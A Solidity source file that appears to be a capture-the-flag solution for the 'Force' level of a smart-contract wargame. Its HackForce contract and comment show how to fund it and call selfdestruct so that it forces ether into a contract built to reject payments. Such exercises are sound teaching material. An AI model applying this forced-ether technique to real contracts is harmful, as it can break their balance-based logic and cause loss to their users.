// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Force.sol';

contract HackForce {
    receive() external payable {}

    function selfDestruct(address payable instanceAddress) public {
        selfdestruct(instanceAddress);
    }
}

/* 
    The first thing you need to do is to send ether to the address of this contract HackForce
    -await web3.eth.sendTransaction({from: player, to: "0x5Ad56425af0082536CF64394F6DAbF0F318Cae68", value:1000})

    Once you have ether on it, you need to call the selfdestruct function
    This way the smart contract called Force can't reject the ether send it
*/